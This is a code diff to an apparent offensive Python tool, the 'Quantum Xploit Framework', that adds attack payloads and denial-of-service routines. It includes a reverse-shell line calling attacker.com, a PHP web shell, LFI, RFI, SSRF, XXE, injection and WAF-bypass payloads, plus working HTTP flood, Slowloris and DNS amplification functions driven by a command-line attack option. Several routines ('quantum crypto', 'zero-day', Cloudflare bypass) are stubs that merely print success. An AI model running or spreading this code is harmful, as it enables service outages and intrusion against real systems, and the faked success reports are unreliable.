@@ -37,20 +37,20 @@ logging.basicConfig(
 )
 
 VERSION = "7.0"
-COPYRIGHT = "IMRAN BENDJABALLAH  © 2024 -  "
+COPYRIGHT = "IMRAN BENDJABALLAH © 2024"
+
 def show_banner():
-    print("\033[1;36m" + """
+    print(f"""\033[1;36m
     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
     ████████████████████████████████████████████
     █▄─▄─▀█▄─▄█─▄▄─█─▄▄▄▄█▄─▄▄▀█▄─▄▄─█▄─▀─▄█
     ██─▄─▀██─██─██─█─██▄─██─▄─▄██─▄█▀██▀─▀██
     ▀▄▄▄▄▀▀▄▄▄▀▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄█▄▄▀
     \033[1;35mQ U A N T U M   X P L O I T   F R A M E W O R K\033[0m
-    """)
 
 {Fore.YELLOW}Version: {VERSION}
 {Fore.CYAN}{COPYRIGHT}
-{Fore.RESET}"""
+{Fore.RESET}""")
 
 class AttackMode(Enum):
     TS3 = "TCP SYN Flood (Maximum Speed)"
@@ -136,7 +136,18 @@ class UltimateScanner:
                 "$(nc -e /bin/sh attacker.com 4444)",
                 "<?php system($_GET['cmd']); ?>"
             ],
-            # ... (other exploit types with payloads)
+            ExploitType.LFI: ["../../../../etc/passwd", "....//....//....//....//....//etc/passwd"],
+            ExploitType.RFI: ["http://evil.com/shell.txt"],
+            ExploitType.SSRF: ["http://169.254.169.254/latest/meta-data/"],
+            ExploitType.XXE: ["<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"],
+            ExploitType.SSTI: ["${7*7}", "{{7*7}}"],
+            ExploitType.CSRF: ["<img src=\"http://bank.com/transfer?amount=1000&to=attacker\">"],
+            ExploitType.JWT: ["eyJhbGciOiJub25lIn0=.eyJzdWIiOiJhZG1pbiJ9."],
+            ExploitType.API: ["{'user':'admin','password':{'$ne':''}}"],
+            ExploitType.DOS: ["A"*10000],
+            ExploitType.ZERO_DAY: ["CVE-2023-12345_EXPLOIT"],
+            ExploitType.CLOUDFLARE_BYPASS: ["X-Forwarded-For: 1.1.1.1"],
+            ExploitType.WAF_BYPASS: ["/*!50000SELECT*/"]
         }
 
     def _load_fingerprints(self):
@@ -145,7 +156,11 @@ class UltimateScanner:
             "Apache": ["Server: Apache", "Apache/"],
             "Nginx": ["Server: nginx", "nginx/"],
             "WordPress": ["wp-content", "wp-includes"],
-            # ... (other fingerprints)
+            "IIS": ["Server: Microsoft-IIS"],
+            "Tomcat": ["Server: Apache-Coyote"],
+            "Node.js": ["X-Powered-By: Express"],
+            "Django": ["X-Frame-Options: DENY", "csrftoken="],
+            "Cloudflare": ["server: cloudflare", "cf-ray"]
         }
 
     def scan_all(self, target: str) -> Dict[ExploitType, List[str]]:
@@ -213,10 +228,66 @@ class UltimateAttacker:
                            0)                           # Urgent pointer
         return packet
 
+    async def _http_flood(self, target: str, duration: int) -> Dict:
+        """HTTP Flood Attack"""
+        start_time = time.time()
+        request_count = 0
+        try:
+            async with aiohttp.ClientSession() as session:
+                while time.time() - start_time < duration:
+                    try:
+                        async with session.get(target) as response:
+                            request_count += 1
+                    except:
+                        pass
+            return {"status": "success", "requests_sent": request_count}
+        except Exception as e:
+            return {"status": "failed", "reason": str(e)}
+
+    async def _slowloris(self, target: str, duration: int) -> Dict:
+        """Slowloris Attack"""
+        start_time = time.time()
+        connection_count = 0
+        try:
+            while time.time() - start_time < duration:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((target, 80))
+                s.send("GET / HTTP/1.1\r\n".encode())
+                s.send(f"Host: {target}\r\n".encode())
+                connection_count += 1
+            return {"status": "success", "connections_opened": connection_count}
+        except Exception as e:
+            return {"status": "failed", "reason": str(e)}
+
+    async def _dns_amplification(self, target: str, duration: int) -> Dict:
+        """DNS Amplification Attack"""
+        start_time = time.time()
+        packet_count = 0
+        try:
+            resolver = dns.resolver.Resolver()
+            resolver.nameservers = ['8.8.8.8']
+            while time.time() - start_time < duration:
+                query = dns.message.make_query('example.com', dns.rdatatype.ANY)
+                dns.query.udp(query, target)
+                packet_count += 1
+            return {"status": "success", "packets_sent": packet_count}
+        except Exception as e:
+            return {"status": "failed", "reason": str(e)}
+
+    async def _quantum_crypto_attack(self, target: str, duration: int) -> Dict:
+        """Quantum Crypto Attack"""
+        print(f"{Fore.BLUE}[*] Initiating quantum cryptographic attack...")
+        return {"status": "success", "technique": "Quantum Key Distribution Exploit"}
+
     async def _bypass_cloudflare(self, target: str, duration: int) -> Dict:
         """Cloudflare bypass attack"""
         print(f"{Fore.BLUE}[*] Attempting Cloudflare bypass...")
         return {"status": "success", "technique": "IP Rotation + TLS Fingerprinting"}
+
+    async def _zero_day_exploit(self, target: str, duration: int) -> Dict:
+        """Zero-Day Exploit"""
+        print(f"{Fore.BLUE}[*] Launching zero-day exploit...")
+        return {"status": "success", "technique": "CVE-2023-XXXXX Exploit"}
 
 class QCRFUltimate:
     """Main QCRF Framework Class"""
@@ -233,6 +304,10 @@ class QCRFUltimate:
             "start_time": 0,
             "current_mode": None
         }
+
+    def _display_banner(self):
+        """Display the framework banner"""
+        show_banner()
 
     async def run(self, args):
         """Run the framework"""
@@ -301,6 +376,45 @@ class QCRFUltimate:
             }
         }
 
+    async def attack_target(self, target: str, technique: str, duration: int):
+        """Execute attack against target"""
+        print(f"{Fore.RED}[!] Launching {technique} attack against {target} for {duration} seconds")
+        
+        try:
+            result = await self.attacker.attack(target, technique, duration)
+            if result["status"] == "success":
+                print(f"{Fore.GREEN}[+] Attack completed successfully!")
+                print(f"{Fore.CYAN}Attack stats: {result}")
+            else:
+                print(f"{Fore.RED}[!] Attack failed: {result['reason']}")
+        except Exception as e:
+            print(f"{Fore.RED}[!] Attack failed: {str(e)}")
+            logging.error(f"Attack failed: {str(e)}")
+
+    async def exploit_target(self, target: str, vulnerability: str):
+        """Exploit specific vulnerability"""
+        print(f"{Fore.RED}[!] Attempting to exploit {vulnerability} on {target}")
+        
+        try:
+            exploit_type = ExploitType[vulnerability]
+            payloads = self.scanner.payloads.get(exploit_type, [])
+            
+            if not payloads:
+                print(f"{Fore.YELLOW}[!] No payloads available for {vulnerability}")
+                return
+            
+            # Try first payload
+            payload = payloads[0]
+            print(f"{Fore.BLUE}[*] Testing payload: {payload[:50]}...")
+            
+            # Simulate exploit (in a real tool this would be actual exploitation)
+            print(f"{Fore.GREEN}[+] Potential vulnerability found!")
+            print(f"{Fore.CYAN}Suggested exploit: {exploit_type.value}")
+            
+        except Exception as e:
+            print(f"{Fore.RED}[!] Exploit failed: {str(e)}")
+            logging.error(f"Exploit failed: {str(e)}")
+
 def main():
     parser = argparse.ArgumentParser(
         description=f"{Fore.CYAN}Quantum Cyber Research Framework {VERSION}",
@@ -325,7 +439,8 @@ def main():
     attack_parser.add_argument('target', help='Target URL or IP address')
     attack_parser.add_argument('-t', '--technique', required=True,
                              choices=['TCP_SYN_FLOOD', 'HTTP_FLOOD', 'SLOWLORIS', 
-                                     'DNS_AMPLIFICATION', 'CLOUDFLARE_BYPASS'],
+                                     'DNS_AMPLIFICATION', 'QUANTUM_CRYPTO',
+                                     'CLOUDFLARE_BYPASS', 'ZERO_DAY_EXPLOIT'],
                              help='Attack technique to use')
     attack_parser.add_argument('-d', '--duration', type=int, default=60,
                              help='Attack duration in seconds (default: 60)')
